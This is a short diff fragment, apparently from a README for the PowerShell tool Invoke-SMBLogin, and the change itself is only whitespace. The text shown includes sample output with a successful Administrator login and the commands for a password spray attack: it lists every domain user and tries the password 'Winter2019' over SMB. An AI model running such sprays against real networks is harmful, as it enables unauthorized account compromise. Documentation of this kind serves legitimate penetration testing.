@@ -27,10 +27,9 @@ ComputerName Username              Password  Result
 192.168.1.2  builtin\Administrator Passw0rd2 Success
 ```  
 This will perform a password spray attack across all domain users using Winter2019 against a host in the domain. It could be a DC or any other member server/workstation as long as it has SMB open.
-```  
+```
 PS C:\> Get-ADUser -Filter * | Select-Object SamAccountName > users.txt
 PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName AnyDomainHost -UserName users.txt -Password Winter2019
-
 ```  
 
 ## Using Invoke-SMBLogin with Powershell Empire ##
